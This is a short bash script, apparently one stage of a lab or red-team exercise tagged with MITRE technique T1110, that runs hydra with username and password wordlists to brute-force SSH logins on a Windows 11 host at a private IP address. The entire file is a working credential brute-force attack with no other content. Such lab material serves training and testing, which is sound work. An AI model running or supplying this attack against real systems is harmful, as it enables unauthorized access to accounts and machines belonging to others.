#!/usr/bin/env bash
# Stage 2 — Brute Force (T1110)
# Host: Kali Linux (attacker) -> Windows 11 victim (OpenSSH)
# Requires: user.txt, password.txt wordlists in the current directory
set -euo pipefail

TARGET="192.168.60.1"

hydra -L user.txt -P password.txt "ssh://${TARGET}"
